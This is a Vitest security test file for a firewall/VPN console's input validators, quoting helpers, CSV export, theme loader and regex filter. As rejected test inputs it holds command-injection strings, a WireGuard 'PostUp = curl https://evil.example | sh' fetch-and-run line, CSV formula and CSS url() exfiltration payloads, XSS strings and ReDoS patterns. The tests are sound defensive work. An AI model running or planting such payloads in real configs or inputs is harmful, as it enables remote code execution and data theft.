import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  buildFleetZtpSnippets,
  buildPortKnockPreviewCommand,
  buildTailscaleConnectCommand,
  buildWireGuardClientProfile,
  isValidCidr,
  isValidHostname,
  isValidInterfaceName,
  isValidIpAddress,
  isValidNodeId,
  isValidToken,
  isValidWireGuardKey,
  posixShellQuote,
  powershellQuote,
  sanitizeHostname,
  sanitizeHttpUrl,
  sanitizeKnockPorts,
  yamlQuoteScalar,
} from '../shell-quote';
import {
  buildPacketTraceCsv,
  escapeCsvCell,
  formatCsvQuotedCell,
  sanitizeCsvCellValue,
} from '../csv-safe';
import {
  ALL_THEME_COLOR_FIELDS,
  BUILTIN_THEMES,
  DEFAULT_THEME_ID,
  fetchThemesFromRemote,
  getStoredCustomThemes,
  getStoredThemeId,
  importThemeFromJSON,
  isValidThemeColor,
  isValidThemeId,
  sanitizeThemeId,
  validateThemeObject,
} from '../themes';
import { fetchInvitePreview } from '../invite-preview';
import { resolveLoginQueryError } from '../login-errors';
import {
  MAX_FILTER_REGEX_LENGTH,
  isSafeFilterRegex,
  matchFilterHaystack,
  safeCompileFilterRegex,
} from '../regex-safe';

const VALID_WG_KEY = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';

describe('SEC-M17: shell-quote, YAML scalar, WireGuard .conf, and input validators', () => {
  it('quotes POSIX and PowerShell single-quoted strings safely', () => {
    expect(posixShellQuote("https://vpn.example.com/a'b$(id)`whoami`")).toBe(
      "'https://vpn.example.com/a'\\''b$(id)`whoami`'"
    );
    expect(posixShellQuote('ok\0nul')).toBe("'oknul'");
    expect(powershellQuote("val'$(calc);`id`")).toBe("'val''$(calc);`id`'");
    expect(powershellQuote('ok\0nul')).toBe("'oknul'");
  });

  it('quotes YAML scalars and rejects newlines, control characters, and quotes', () => {
    expect(yamlQuoteScalar('edge-ngfw-01')).toBe('"edge-ngfw-01"');
    expect(() => yamlQuoteScalar('edge-01\nwrite_files: []')).toThrow();
    expect(() => yamlQuoteScalar('edge-01\r\nfoo: bar')).toThrow();
    expect(() => yamlQuoteScalar('edge"01')).toThrow();
    expect(() => yamlQuoteScalar("edge'01")).toThrow();
  });

  it('validates hostnames, URLs, interfaces, CIDRs, tokens, and WireGuard keys strictly', () => {
    expect(isValidHostname('vow.axonwall.local')).toBe(true);
    expect(isValidHostname('10.0.0.1')).toBe(true);
    expect(isValidHostname('user@evil.com')).toBe(false);
    expect(isValidHostname('good.com@evil.com')).toBe(false);
    expect(isValidHostname('https://vow.axonwall.local')).toBe(false);
    expect(isValidHostname('bad host')).toBe(false);

    expect(sanitizeHostname('HTTPS://VPN.Example.COM:8443/invite')).toBe('vpn.example.com');
    expect(sanitizeHostname('user@evil.com')).toBeNull();
    expect(sanitizeHostname('evil.com;id')).toBeNull();

    expect(sanitizeHttpUrl('https://vpn.example.com:8443/')).toBe('https://vpn.example.com:8443');
    expect(sanitizeHttpUrl('https://user:pass@vpn.example.com')).toBeNull();
    expect(sanitizeHttpUrl('https://vpn.example.com/$(id)')).toBeNull();
    expect(sanitizeHttpUrl('javascript:alert(1)')).toBeNull();

    expect(isValidInterfaceName('eth0')).toBe(true);
    expect(isValidInterfaceName('eth0.100')).toBe(true);
    expect(isValidInterfaceName('br-lan')).toBe(true);
    expect(isValidInterfaceName('eth0;rm -rf /')).toBe(false);
    expect(isValidInterfaceName('eth0\nPostUp')).toBe(false);
    expect(isValidInterfaceName('verylonginterfacename123')).toBe(false);

    expect(isValidIpAddress('10.50.0.1')).toBe(true);
    expect(isValidIpAddress('2001:db8::1')).toBe(true);
    expect(isValidIpAddress('10.50.0.1\nPostUp=id')).toBe(false);
    expect(isValidIpAddress('012.0.0.1')).toBe(false);

    expect(isValidCidr('10.50.0.2/32')).toBe(true);
    expect(isValidCidr('fd00::1/64')).toBe(true);
    expect(isValidCidr('10.50.0.2/33')).toBe(false);
    expect(isValidCidr('10.50.0.2/32\nPostUp = id')).toBe(false);

    expect(isValidToken('hskey_abc-123.XYZ')).toBe(true);
    expect(isValidToken('tok$(id)')).toBe(false);
    expect(isValidToken('tok\nfoo')).toBe(false);

    expect(isValidNodeId('edge-ngfw-01')).toBe(true);
    expect(isValidNodeId('bad node')).toBe(false);
    expect(isValidNodeId('bad\nnode')).toBe(false);

    expect(isValidWireGuardKey(VALID_WG_KEY)).toBe(true);
    expect(isValidWireGuardKey(`${VALID_WG_KEY}\nPostUp = id`)).toBe(false);
    expect(isValidWireGuardKey('short-key')).toBe(false);

    expect(sanitizeKnockPorts('41821, 52913, 38477')).toEqual([41821, 52913, 38477]);
    expect(sanitizeKnockPorts('41821;id, $(whoami), 99999, 52913')).toEqual([52913]);
  });

  it('builds safe quoted Tailscale and port-knock commands', () => {
    const linuxCmd = buildTailscaleConnectCommand(
      'linux',
      'https://vpn.example.com:8443',
      'hskey-test-123'
    );
    expect(linuxCmd).toBe(
      "sudo tailscale up --login-server='https://vpn.example.com:8443' --authkey='hskey-test-123'"
    );

    const poisonedLinux = buildTailscaleConnectCommand(
      'linux',
      'https://vpn.example.com/$(touch /tmp/pwn)',
      'bad;rm -rf /'
    );
    expect(poisonedLinux).toBe(
      "sudo tailscale up --login-server='<YOUR_HEADSCALE_URL>' --authkey='<YOUR_AUTH_KEY>'"
    );

    const psCmd = buildTailscaleConnectCommand(
      'windows',
      'https://vpn.example.com',
      'hskey-test-123'
    );
    expect(psCmd).toBe(
      `& "C:\\Program Files\\Tailscale\\tailscale.exe" up '--login-server=https://vpn.example.com' '--authkey=hskey-test-123'`
    );

    const dockerCmd = buildTailscaleConnectCommand(
      'docker',
      'https://vpn.example.com',
      'hskey-test-123'
    );
    expect(dockerCmd).toBe(
      "docker run -d --name=tailscale --restart=unless-stopped -e 'TS_AUTHKEY=hskey-test-123' -e 'TS_EXTRA_ARGS=--login-server=https://vpn.example.com' ghcr.io/tailscale/tailscale:latest"
    );

    const knockCmd = buildPortKnockPreviewCommand(
      'https://vpn.example.com:8443/invite',
      'udp',
      '41821, 52913;id, $(whoami), 38477'
    );
    expect(knockCmd).toContain("for p in 41821 38477; do printf 'knock' | nc -u -w 1 'vpn.example.com'");
    expect(knockCmd).not.toContain('whoami');
  });

  it('builds quoted Fleet ZTP YAML/CLI snippets and rejects injection attempts', () => {
    const ok = buildFleetZtpSnippets({
      hubHostname: 'fw01.corp.local',
      listenPort: 2966,
      nodeId: 'edge-01',
      nodeRole: 'edge-ngfw',
      nodeSku: 'sku-vm-virtio',
      wanInterface: 'eth0',
      lanInterface: 'eth1',
      ztpToken: 'ztp_axon_secret123',
    });
    expect(ok.ok).toBe(true);
    if (ok.ok) {
      expect(ok.cloudInitSnippet).toContain('hostname: "edge-01"');
      expect(ok.cloudInitSnippet).toContain('hub: "wss://fw01.corp.local:2966/ws/satellite"');
      expect(ok.cloudInitSnippet).toContain('token: "ztp_axon_secret123"');
      expect(ok.bootstrapCommand).toContain("--sku 'sku-vm-virtio'");
      expect(ok.bootstrapCommand).toContain("--cmdline 'console=ttyS0,115200");
    }

    const injectedNewline = buildFleetZtpSnippets({
      hubHostname: 'fw01.corp.local',
      listenPort: 2966,
      nodeId: 'edge-01\nruncmd: [id]',
      nodeRole: 'edge-ngfw',
      nodeSku: 'sku-vm-virtio',
      wanInterface: 'eth0',
      lanInterface: 'eth1',
      ztpToken: 'ztp_axon_secret123',
    });
    expect(injectedNewline.ok).toBe(false);

    const injectedToken = buildFleetZtpSnippets({
      hubHostname: 'fw01.corp.local',
      listenPort: 2966,
      nodeId: 'sat-01',
      nodeRole: 'satellite',
      nodeSku: 'generic-edge',
      wanInterface: 'eth0',
      lanInterface: 'eth1',
      ztpToken: 'tok" $(id)',
    });
    expect(injectedToken.ok).toBe(false);
  });

  it('blocks CR/LF PostUp injection and validates fields in WireGuard client .conf generation', () => {
    const valid = buildWireGuardClientProfile({
      peerName: 'laptop-01',
      allowedIp: '10.50.0.2/32',
      serverAddress: '10.50.0.1/24',
      serverPublicKey: VALID_WG_KEY,
      listenPort: 51820,
      systemHostname: 'vpn',
      systemDomain: 'axonwall.local',
    });
    expect(valid.ok).toBe(true);
    if (valid.ok) {
      expect(valid.conf).toContain('Address = 10.50.0.2/32');
      expect(valid.conf).toContain('DNS = 10.50.0.1');
      expect(valid.conf).toContain('Endpoint = vpn.axonwall.local:51820');
    }

    expect(
      buildWireGuardClientProfile({
        peerName: 'laptop-01\nPostUp = curl https://evil.example | sh',
        allowedIp: '10.50.0.2/32',
        serverAddress: '10.50.0.1/24',
        serverPublicKey: VALID_WG_KEY,
        listenPort: 51820,
      }).ok
    ).toBe(false);

    expect(
      buildWireGuardClientProfile({
        peerName: 'laptop-01',
        allowedIp: '10.50.0.2/32\r\nPostUp = id',
        serverAddress: '10.50.0.1/24',
        serverPublicKey: VALID_WG_KEY,
        listenPort: 51820,
      }).ok
    ).toBe(false);

    expect(
      buildWireGuardClientProfile({
        peerName: 'laptop-01',
        allowedIp: '10.50.0.2/32',
        serverAddress: '10.50.0.1/24',
        serverPublicKey: VALID_WG_KEY,
        listenPort: 51820,
        systemDomain: 'axonwall.local\nPostUp = id',
      }).ok
    ).toBe(false);
  });
});

describe('SEC-M19: CSV formula neutralization', () => {
  it('neutralizes leading and whitespace-prefixed formula triggers and collapses CRLF', () => {
    expect(sanitizeCsvCellValue('=CMD("calc")')).toBe('\'=CMD("calc")');
    expect(sanitizeCsvCellValue('+1+1')).toBe("'+1+1");
    expect(sanitizeCsvCellValue('-1+1')).toBe("'-1+1");
    expect(sanitizeCsvCellValue('@SUM(A1:A2)')).toBe("'@SUM(A1:A2)");
    expect(sanitizeCsvCellValue('\t=1+1')).toBe("'\t=1+1");
    expect(sanitizeCsvCellValue('\r=1+1')).toBe("' =1+1");
    expect(sanitizeCsvCellValue('   =1+1')).toBe("'   =1+1");
    expect(sanitizeCsvCellValue('line1\r\nline2\nline3')).toBe('line1 line2 line3');

    expect(escapeCsvCell('=1+1,2')).toBe('"\'=1+1,2"');
    expect(formatCsvQuotedCell('He said "hi"\n=evil')).toBe('"He said ""hi"" =evil"');
  });

  it('neutralizes formula payloads inside packet trace CSV exports', () => {
    const csv = buildPacketTraceCsv([
      {
        index: 1,
        timestamp: '2026-11-27T00:00:00Z',
        protocol: 'TCP',
        srcIp: '10.0.0.5',
        srcPort: 443,
        dstIp: '10.0.0.9',
        dstPort: 51234,
        length: 120,
        info: '  =HYPERLINK("https://evil.example","Click")\r\n@evil',
      },
    ]);
    const lines = csv.trim().split('\n');
    expect(lines).toHaveLength(2);
    expect(lines[1]).toContain('"\'  =HYPERLINK(""https://evil.example"",""Click"") @evil"');
  });
});

describe('SEC-L19: Theme validation, localStorage re-validation, and HTTPS remote fetch', () => {
  const validColors = { ...BUILTIN_THEMES[0].colors };

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it('validates all 13 theme color fields and rejects CSS injection in any field', () => {
    expect(ALL_THEME_COLOR_FIELDS).toHaveLength(13);
    expect(isValidThemeColor('#080c14')).toBe(true);
    expect(isValidThemeColor('#fff')).toBe(true);
    expect(isValidThemeColor('rgba(16, 185, 129, 0.5)')).toBe(true);
    expect(isValidThemeColor('hsl(160, 84%, 39%)')).toBe(true);
    expect(isValidThemeColor('#000; background: url(https://evil.example)')).toBe(false);
    expect(isValidThemeColor('expression(alert(1))')).toBe(false);
    expect(isValidThemeColor('var(--evil)')).toBe(false);

    for (const field of ALL_THEME_COLOR_FIELDS) {
      const poisoned = {
        id: 'test-theme',
        name: 'Test Theme',
        colors: {
          ...validColors,
          [field]: 'red; background-image: url(https://evil.test/x)',
        },
      };
      expect(() => validateThemeObject(poisoned)).toThrow();
    }
  });

  it('sanitizes theme IDs strictly to /^[a-z0-9_-]{1,64}$/', () => {
    expect(isValidThemeId('axonwall-emerald')).toBe(true);
    expect(isValidThemeId('a'.repeat(65))).toBe(false);
    expect(isValidThemeId('bad id!')).toBe(false);

    expect(sanitizeThemeId('  My Custom/Theme!!  ')).toBe('my-custom-theme');
    expect(sanitizeThemeId('x'.repeat(100))).toHaveLength(64);
    expect(() => sanitizeThemeId('!!!')).toThrow();

    const imported = importThemeFromJSON(
      JSON.stringify({
        id: 'Bad Theme<script>',
        name: 'Clean Theme',
        colors: validColors,
      })
    );
    expect(Array.isArray(imported)).toBe(false);
    if (!Array.isArray(imported)) {
      expect(imported.id).toMatch(/^[a-z0-9_-]{1,64}$/);
      expect(imported.id).toBe('bad-theme-script');
    }
  });

  it('re-validates localStorage themes and theme ID on read', () => {
    const store = new Map<string, string>();
    vi.stubGlobal('window', {});
    vi.stubGlobal('localStorage', {
      getItem: (k: string) => store.get(k) ?? null,
      setItem: (k: string, v: string) => {
        store.set(k, v);
      },
      removeItem: (k: string) => {
        store.delete(k);
      },
    });

    store.set('axonwall_theme_id', 'evil" onmouseover="alert(1)');
    expect(getStoredThemeId()).toBe(DEFAULT_THEME_ID);

    store.set('axonwall_theme_id', 'solarized-dark');
    expect(getStoredThemeId()).toBe('solarized-dark');

    store.set(
      'axonwall_custom_themes',
      JSON.stringify([
        {
          id: 'valid-custom',
          name: 'Valid Custom',
          colors: validColors,
        },
        {
          id: 'poisoned-custom',
          name: 'Poisoned',
          colors: { ...validColors, readerBg: 'url(https://attacker.invalid/leak)' },
        },
      ])
    );

    const loaded = getStoredCustomThemes();
    expect(loaded).toHaveLength(1);
    expect(loaded[0]?.id).toBe('valid-custom');
  });

  it('restricts fetchThemesFromRemote() to https: URLs and passes credentials: omit', async () => {
    await expect(fetchThemesFromRemote('http://example.com/themes.json')).rejects.toThrow(/https/);
    await expect(fetchThemesFromRemote('/local/themes.json')).rejects.toThrow(/https/);
    await expect(fetchThemesFromRemote('https://user:pass@example.com/themes.json')).rejects.toThrow(
      /credentials/
    );
    await expect(fetchThemesFromRemote('http://github.com/owner/repo')).rejects.toThrow(/https/);

    const fetchMock = vi.fn(async () => ({
      ok: true,
      url: 'https://raw.githubusercontent.com/winnegansFake/winnegansFake/main/themes.json',
      text: async () =>
        JSON.stringify({
          themes: [{ id: 'remote-1', name: 'Remote 1', colors: validColors }],
        }),
    }));
    vi.stubGlobal('fetch', fetchMock);

    const themes = await fetchThemesFromRemote('https://github.com/winnegansFake/winnegansFake');
    expect(themes).toHaveLength(1);
    expect(themes[0]?.id).toBe('remote-1');
    expect(fetchMock).toHaveBeenCalledWith(
      'https://raw.githubusercontent.com/winnegansFake/winnegansFake/main/themes.json',
      { credentials: 'omit' }
    );
  });
});

describe('SEC-M18 & SEC-L21: Invite preview POST and login error allowlist', () => {
  it('sends invite preview token in POST JSON body rather than URL query string', async () => {
    const fetchMock = vi.fn(async (_input: RequestInfo | URL, _init?: RequestInit) => {
      return new Response(
        JSON.stringify({
          status: 'ok',
          data: { status: 'valid', username: 'alice', requiresPin: true },
        }),
        { status: 200, headers: { 'Content-Type': 'application/json' } }
      );
    });

    const data = await fetchInvitePreview('secret-invite-token-xyz', fetchMock as unknown as typeof fetch);
    expect(data.status).toBe('valid');
    expect(data.username).toBe('alice');
    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0]!;
    expect(url).toBe('/api/v1/vpn/mesh/invites/preview');
    expect(String(url)).not.toContain('secret-invite-token-xyz');
    expect(init?.method).toBe('POST');
    expect(init?.cache).toBe('no-store');
    expect(init?.headers).toEqual({ 'Content-Type': 'application/json' });
    expect(init?.body).toBe(JSON.stringify({ token: 'secret-invite-token-xyz' }));
  });

  it('maps only allowlisted login error codes and discards arbitrary URL text', () => {
    expect(resolveLoginQueryError('sso_not_configured')).toBe('SSO is not configured.');
    expect(resolveLoginQueryError('SSO is not configured')).toBe('SSO is not configured.');
    expect(resolveLoginQueryError('SSO provider unreachable')).toBe('SSO provider unreachable.');
    expect(resolveLoginQueryError('Invalid SSO callback')).toBe('Invalid SSO callback.');
    expect(resolveLoginQueryError('Invalid SSO state')).toBe('Invalid SSO state.');
    expect(resolveLoginQueryError('Your SSO account is not authorized for any Axonwall role')).toBe(
      'Your SSO account is not authorized for any Axonwall role.'
    );
    expect(resolveLoginQueryError('SSO sign-in failed')).toBe('SSO sign-in failed.');
    expect(resolveLoginQueryError('sso_email_unverified')).toBe(
      'Your SSO email address must be verified before signing in.'
    );

    expect(resolveLoginQueryError('Session expired. Call 1-800-EVIL now')).toBeNull();
    expect(resolveLoginQueryError('<script>alert(1)</script>')).toBeNull();
    expect(resolveLoginQueryError('constructor')).toBeNull();
    expect(resolveLoginQueryError('toString')).toBeNull();
    expect(resolveLoginQueryError('')).toBeNull();
    expect(resolveLoginQueryError(null)).toBeNull();
  });
});

describe('SEC-L20: K9s filter regex length cap and nested quantifier ReDoS guard', () => {
  it('allows normal filter regexes and blocks oversized or nested-quantifier ReDoS patterns', () => {
    expect(isSafeFilterRegex('^kube-system$')).toBe(true);
    expect(isSafeFilterRegex('pod-[0-9]+')).toBe(true);
    expect(isSafeFilterRegex('err(or)?')).toBe(true);
    expect(isSafeFilterRegex('(nginx|coredns)')).toBe(true);

    expect(isSafeFilterRegex('a'.repeat(MAX_FILTER_REGEX_LENGTH))).toBe(true);
    expect(isSafeFilterRegex('a'.repeat(MAX_FILTER_REGEX_LENGTH + 1))).toBe(false);

    expect(isSafeFilterRegex('(a+)+')).toBe(false);
    expect(isSafeFilterRegex('(a*)*$')).toBe(false);
    expect(isSafeFilterRegex('([a-z]+\\s*)+')).toBe(false);
    expect(isSafeFilterRegex('((a)+)+')).toBe(false);
    expect(isSafeFilterRegex('(a{1,5})+')).toBe(false);
    expect(isSafeFilterRegex('(a|aa)+')).toBe(false);
    expect(isSafeFilterRegex('a++')).toBe(false);
    expect(isSafeFilterRegex('(a)\\1+')).toBe(false);

    expect(safeCompileFilterRegex('(a+)+')).toBeNull();
    expect(safeCompileFilterRegex('a'.repeat(129))).toBeNull();
    expect(safeCompileFilterRegex('^coredns-[0-9]+$')).toBeInstanceOf(RegExp);

    // Unsafe regex falls back safely to literal substring search without hanging
    const evilInput = `${'a'.repeat(40)}!`;
    expect(matchFilterHaystack(evilInput, '/(a+)+$/')).toBe(false);
    expect(matchFilterHaystack('coredns-789012', '/^coredns-[0-9]+$/')).toBe(true);
    expect(matchFilterHaystack('coredns-7b9f8c', '/^coredns-[0-9a-f]+$/')).toBe(true);
  });
});
